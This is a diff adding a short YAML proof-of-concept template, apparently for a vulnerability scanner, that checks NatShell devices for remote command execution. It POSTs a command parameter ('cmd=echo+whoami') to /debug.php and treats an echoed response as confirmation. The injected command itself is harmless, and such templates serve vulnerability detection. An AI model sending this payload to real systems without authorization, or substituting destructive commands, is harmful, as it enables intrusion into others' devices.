@@ -1,0 +1,13 @@
+name: poc-yaml-natshell-debug-rce
+rules:
+  - method: POST
+    path: /debug.php?_t=0.6552206544742862
+    follow_redirects: false
+    body: |
+      cmd=echo+whoami
+    expression: |
+      response.status == 200 && "whoami".bmatches(response.body)
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - https://mp.weixin.qq.com/s/CVe7GSRzCKcYXj5Pj8W5SA
